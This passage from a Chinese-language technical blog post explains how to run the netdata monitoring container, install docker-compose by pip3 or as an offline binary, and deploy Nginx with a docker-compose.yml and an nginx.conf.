Linux 系统，应用程序，SNMP 服务等提供实时的性能监测，并通过可视化图表信息呈现至web页面</p></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_"># </span><span class="language-bash">获取netdata镜像</span><br>docker search netdata<br>docker pull netdata/netdata<br><span class="hljs-meta prompt_"># </span><span class="language-bash">启动</span><br>docker run -d --name=netdata \<br>  -p 19999:19999 \<br>  -v netdataconfig:/etc/netdata \<br>  -v netdatacache:/var/cache/netdata \<br>  -v netdatalib:/var/lib/netdata \<br>  -v /etc/passwd:/host/etc/passwd:ro \<br>  -v /etc/group:/host/etc/group:ro \<br>  -v /proc:/host/proc:ro \<br>  -v /sys:/host/sys:ro \<br>  -v /etc/os-release:/host/etc/os-release:ro \<br>  --restart unless-stopped \<br>  --cap-add SYS_PTRACE \<br>  --security-opt apparmor=unconfined \<br>  netdata/netdata<br><span class="hljs-meta prompt_">  </span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">查看容器状态，通过 ip:19999 访问web页面</span><br>docker ps -a<br></code></pre></td></tr></table></figure><h1 id="docker-compose安装"><a href="#docker-compose安装" class="headerlink" title="docker-compose安装"></a>docker-compose安装</h1><blockquote><p>docker-compose项目是<a href="https://cloud.tencent.com/product/tke?from=10680">Docker</a>官方的开源项目，负责实现对Docker<a href="https://cloud.tencent.com/product/tke?from=10680">容器</a>集群的快速编排。它是一个定义和运行多容器的 docker应用工具。使用compose，你能通过YMAL文件配置你自己的服务，然后通过一个命令，你能使用配置文件 创建和运行所有的服务。重点可以启动多个容器！ </p></blockquote><h2 id="方式一：通过pip3安装"><a href="#方式一：通过pip3安装" class="headerlink" title="方式一：通过pip3安装"></a>方式一：通过pip3安装</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_"># </span><span class="language-bash">安装pip</span><br>yum -y install python-pip<br><span class="hljs-meta prompt_"># </span><span class="language-bash">更新pip3</span><br>pip3 install --upgrade pip<br><span class="hljs-meta prompt_"># </span><span class="language-bash">安装docker-compose</span><br>pip3 install docker-compose<br><span class="hljs-meta prompt_"># </span><span class="language-bash">查看docker-compose版本</span><br>docker-compose version<br></code></pre></td></tr></table></figure><h2 id="方式二：离线安装"><a href="#方式二：离线安装" class="headerlink" title="方式二：离线安装"></a>方式二：离线安装</h2><p> 访问<a href="https://github.com/docker/compose/releases%EF%BC%8C%E4%B8%8B%E8%BD%BD">https://github.com/docker/compose/releases，下载</a> <code>docker-compose-Linux-x86_64</code> ，下载后重命名文件为 <code>docker-compose</code> ，可通过FTP工具上传到服务器<code>/usr/local/bin/</code> 目录下</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_"># </span><span class="language-bash">添加可执行权限</span><br>sudo chmod +x /usr/local/bin/docker-compose<br><span class="hljs-meta prompt_"># </span><span class="language-bash">查看docker-compose版本</span><br>docker-compose verison<br></code></pre></td></tr></table></figure><h1 id="docker-compose-安装-Nginx"><a href="#docker-compose-安装-Nginx" class="headerlink" title="docker-compose 安装 Nginx"></a>docker-compose 安装 Nginx</h1><p>创建<code>nginx</code> 目录，在目录下编辑 <code>docker-compose.yml</code> 文件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">mkdir</span> ./nginx &amp;&amp; <span class="hljs-built_in">cd</span> ./nginx<br>vim docker-compose.yml<br></code></pre></td></tr></table></figure><p>内容如下，<code>version</code> 版本号需要与<code>docker-compose</code> 版本对应，不然会报错</p><p>CentOS7中Docker文件挂载，容器中没有执行权限，故需添加参数</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-attr">version:</span> <span class="hljs-string">&#x27;3&#x27;</span><br><span class="hljs-attr">services:</span><br>    <span class="hljs-attr">nginx:</span><br>        <span class="hljs-attr">image:</span> <span class="hljs-string">nginx</span>     <span class="hljs-comment"># 镜像名称</span><br>        <span class="hljs-attr">container_name:</span> <span class="hljs-string">nginx</span>     <span class="hljs-comment"># 容器名字</span><br>        <span class="hljs-attr">restart:</span> <span class="hljs-string">always</span>     <span class="hljs-comment"># 开机自动重启</span><br>        <span class="hljs-attr">ports:</span>     <span class="hljs-comment"># 端口号绑定（宿主机:容器内）</span><br>            <span class="hljs-bullet">-</span> <span class="hljs-string">&#x27;80:80&#x27;</span><br>            <span class="hljs-bullet">-</span> <span class="hljs-string">&#x27;443:443&#x27;</span><br>        <span class="hljs-attr">volumes:</span>      <span class="hljs-comment"># 目录映射（宿主机:容器内）</span><br>            <span class="hljs-bullet">-</span> <span class="hljs-string">./conf/nginx.conf:/etc/nginx/nginx.conf</span><br>            <span class="hljs-bullet">-</span> <span class="hljs-string">./conf.d:/etc/nginx/conf.d</span><br>            <span class="hljs-bullet">-</span> <span class="hljs-string">./html:/usr/share/nginx/html</span><br></code></pre></td></tr></table></figure><p>需要事先准备<code>nginx.conf</code> 文件在挂载目录<code>./conf/nginx.conf</code>，否则会报试图将文件挂载至目录的错误（_因docker挂载目录文件，若挂载的宿主机目录不存在默认会创建一个新<code>directory</code> ，若原本想挂载的是 <code>file</code> 而docker默认创建的是<code>directory</code> 则会报该错误_）</p><ul><li><code>nginx.conf</code>配置如下</li></ul><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-comment">#user  nobody;</span><br><span class="hljs-string">worker_processes</span>  <span class="hljs-number">1</span><span class="hljs-string">;</span><br><br><span class="hljs-string">events</span> &#123;<br>    <span class="hljs-string">worker_connections</span>  <span class="hljs-number">1024</span><span class="hljs-string">;</span><br>&#125;<br><br><br><span class="hljs-string">http</span> &#123;<br>    <span class="hljs-string">include</span>       <span class="hljs-string">mime.types;</span><br>    <span class="hljs-string">default_type</span>  <span class="hljs-string">application/octet-stream;</span><br><br>    <span class="hljs-string">sendfile</span>        <span class="hljs-string">on;</span><br><br>    <span class="hljs-string">keepalive_timeout</span>  <span class="hljs-number">65</span><span class="hljs-string">;</span><br><br>    <span class="hljs-string">server</span> &#123;<br>        <span class="hljs-string">listen</span>       <span class="hljs-number">80</span><span class="hljs-string">;</span><br>        <span class="hljs-string">server_name</span>  <span class="hljs-string">localhost;</span><br><br>        <span class="hljs-comment">#access_log  logs/host.access.log  main;</span><br><br>        <span class="hljs-string">location</span> <span class="hljs-string">/</span> &#123;<br>            <span class="hljs-string">root</span>   <span class="hljs-string">/usr/share/nginx/html;</span><br>            <span class="hljs-string">index</span>  <span class="hljs-string">index.html</span> <span class="hljs-string">index.htm;</span><br>        &#125;<br><br>        <span class="hljs-comment">#error_page  404              /404.html;</span><br><br>        <span class="hljs-comment"># redirect server error pages to the static page /50x.html</span><br>        <span class="hljs-comment">#</span><br>        <span class="hljs-string">error_page</span>   <span class="hljs-number">500</span> <span class="hljs-number">502</span> <span class="hljs-number">503</span> <span class="hljs-number">504</span>  <span class="hljs-string">/50x.html;</span><br>        <span class="hljs-string">location</span> <span class="hljs-string">=</span> <span class="hljs-string">/50x.html</span> &#123;<br>            <span class="hljs-string">root</span>   <span class="hljs-string">html;</span><br>        &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><p>需要注意<code> location</code> 中 <code>root</code> 的配置，因为之前选择了挂载，所以需要填写为容器内的<code>html</code> 路径，否则会报<code>404</code> 错误</p><p>至此 <code>nginx</code> 目录结构为</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash">|-- conf<br>|   `-- nginx.conf<br>|-- conf.d<br>|-- docker-compose.yml<br>`-- html<br>    |`-- index.html<br></code></pre></td></tr></table></figure><p>执行命令启动Nginx容器，通过 <code>ip:80</code> 访问是否启动成功你</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">docker-compose up -d nginx<br></code></pre></td></tr></table></figure>]]></content>
    
    
    
  </entry>
  
  
  
  
</search>
